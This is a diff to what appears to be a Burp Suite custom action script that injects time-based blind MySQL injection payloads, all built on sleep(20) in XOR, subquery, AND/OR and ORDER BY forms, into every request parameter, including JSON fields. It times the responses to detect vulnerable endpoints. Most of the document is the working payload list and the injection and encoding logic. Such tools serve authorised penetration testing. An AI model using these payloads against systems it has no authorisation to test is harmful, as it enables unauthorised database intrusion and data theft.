@@ -3,79 +3,49 @@ name: MySQL Time-Based
 function: CUSTOM_ACTION
 location: REPEATER
 source: |+
-	/**
-	* Append a time-based MySQL payload to each query parameter, one at a time.
-	* Sends each mutated request sequentially and logs high-level timing data
-	* so you can watch for slow responses in Logger or the console.
-	* Also reports the findings to the Issues dashboard.
-	* Handles both regular parameters and JSON-encoded parameters.
-	* @author slicingmelon
-	**/
+/**
+* Append a time-based MySQL payload to each query parameter, one at a time.
+* Sends each mutated request sequentially and logs high-level timing data
+* so you can watch for slow responses in Logger or the console.
+* Also reports the findings to the Issues dashboard.
+* Handles both regular parameters and JSON-encoded parameters.
+* @author slicingmelon
+**/
 
 var payloads = java.util.List.of(
-	"""
-		'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z
-		""".strip(),
-	"""
-		'XOR(if(isnull(nullif(now(),sysdate())),sleep(20),0))XOR'Z
-		""".strip(),
-	"""
-		'XOR(if(isnull(nullif(now(),sysdate())),sleep(20),0))XOR'Z
-		""".strip(),
-	"""
-		'(select(1)from(select(sleep(20)))a)'
-		""".strip(),
-	"""
-		(select(1)from(select(sleep(20)))a)
-		""".strip(),
-	"""
-		(select(1)from(select(sleep(20)))a)-- z
-		""".strip(),
-	"""
-		'+(select(1)from(select(sleep(20)))a)+'
-		""".strip(),
-	"""
-		-(select(1)from(select(sleep(20)))a)
-		""".strip(),
-	"""
-		,(select(1)from(select(sleep(20)))a)
-		""".strip(),
-	"""
-		,(select(1)from(select(sleep(20)))a)-- z
-		""".strip(),
-	"""
-		'OR(select(1)from(select(sleep(20)))a)OR'Z
-		""".strip(),
-	"""
-		'AND(select(1)from(select(sleep(20)))a)AND'Z
-		""".strip(),
-	"""
-		AND (select(1)from(select(sleep(20)))a)-- z
-		""".strip(),
-	"""
-		' AND (select(1)from(select(sleep(20)))a)-- z
-		""".strip(),
-	"""
-		) AND (select(1)from(select(sleep(20)))a)-- z
-		""".strip(),
-	"""
-		') AND (select(1)from(select(sleep(20)))a)-- z
-		""".strip(),
-	"""
-		->test"',(select(1)from(select(sleep(20)))a)-- z"'
-		""".strip(),
-	"""
-		->test"'))# (select(1)from(select(sleep(20)))a)-- z
-		""".strip(),
-	"""
-		->test"' ASC, (select(1)from(select(sleep(20)))a)) DESC-- z"'
-		""".strip()
+	"'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z",
+	"'XOR(if(isnull(nullif(now(),sysdate())),sleep(20),0))XOR'Z",
+	"'(select(1)from(select(sleep(20)))a)'",
+	"(select(1)from(select(sleep(20)))a)",
+	"(select(1)from(select(sleep(20)))a)-- z",
+	"'+(select(1)from(select(sleep(20)))a)+'",
+	"-(select(1)from(select(sleep(20)))a)",
+	",(select(1)from(select(sleep(20)))a)",
+	",(select(1)from(select(sleep(20)))a)-- z",
+	"'OR(select(1)from(select(sleep(20)))a)OR'Z",
+	"'AND(select(1)from(select(sleep(20)))a)AND'Z",
+	" AND (select(1)from(select(sleep(20)))a)-- z",
+	"' AND (select(1)from(select(sleep(20)))a)-- z",
+	") AND (select(1)from(select(sleep(20)))a)-- z",
+	"') AND (select(1)from(select(sleep(20)))a)-- z",
+	"->test\"',(select(1)from(select(sleep(20)))a)-- z\"'",
+	"->test\"'))# (select(1)from(select(sleep(20)))a)-- z",
+	"->test\"' ASC, (select(1)from(select(sleep(20)))a)) DESC-- z\"'"
+
 );
 
 var bypassCache = true;
 var detectionThresholdMs = 20000L;
 
 var detectionFound = false;
+
+// Custom URL encode - only encodes space, +, #, = (characters that break URL structure)
+var customUrlEncode = (java.util.function.Function<String, String>)(str -> {
+	return str.replace(" ", "%20")
+	          .replace("+", "%2b")
+	          .replace("#", "%23")
+	          .replace("=", "%3D");
+});
 
 // Helper function to inject payload into a JSON string
 var injectIntoJson = (java.util.function.BiFunction<String, String, java.util.List<java.util.Map.Entry<String, String>>>)((jsonStr, payload) -> {
@@ -227,8 +197,8 @@ for (int i = 0; i < pairs.length; i++) {
 	} else {
 		// Handle regular parameter - inject directly
 		for (String payload : payloads) {
-			// URL encode the payload for safe injection
-			var encodedPayload = api().utilities().urlUtils().encode(payload);
+			// Custom URL encode the payload (only space, +, #, =)
+			var encodedPayload = customUrlEncode.apply(payload);
 			
 			var builder = new StringBuilder();
 			for (int j = 0; j < pairs.length; j++) {
